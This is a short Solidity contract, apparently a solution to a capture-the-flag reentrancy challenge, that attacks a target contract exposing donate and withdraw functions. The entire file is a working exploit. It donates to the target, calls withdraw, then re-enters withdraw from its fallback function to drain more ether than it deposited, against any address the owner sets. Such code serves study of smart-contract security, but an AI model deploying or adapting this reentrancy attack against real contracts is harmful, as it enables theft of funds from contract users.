// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentranceMyHack {

    address owner = msg.sender;
    address hacked;
    bool reenter = true;

    modifier onlyOwner {
        require(msg.sender == owner, "Owner only call");
        _;
    }

    function setAddress(address _adr) public onlyOwner {
        hacked = _adr;
    }

    function startAttack() public payable onlyOwner {
        IReentrance(hacked).donate{value: msg.value}(address(this));
        IReentrance(hacked).withdraw(msg.value);
    }

    fallback() external payable {
        if(reenter) {
            IReentrance(hacked).withdraw(msg.value);
        }
        reenter = false;
    }

}    